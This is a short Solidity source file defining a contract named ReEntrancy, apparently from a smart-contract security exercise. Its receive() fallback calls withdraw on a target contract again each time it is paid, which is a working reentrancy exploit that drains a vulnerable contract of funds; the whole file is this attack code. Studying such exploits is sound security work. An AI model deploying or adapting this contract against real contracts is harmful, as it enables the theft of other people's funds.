// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IReEntrant {
    function withdraw(uint256) external;
}

contract ReEntrancy {
    uint256 public balance;
    IReEntrant public ReEntrantContract;

    constructor(address _ReEntrantContract) {
        balance = 1000000000000000;
        ReEntrantContract = IReEntrant(_ReEntrantContract);
    }

    function withdraw() external {
        ReEntrantContract.withdraw(1000000000000000);
    }

    receive() external payable {
        ReEntrantContract.withdraw(1000000000000000);
    }
}
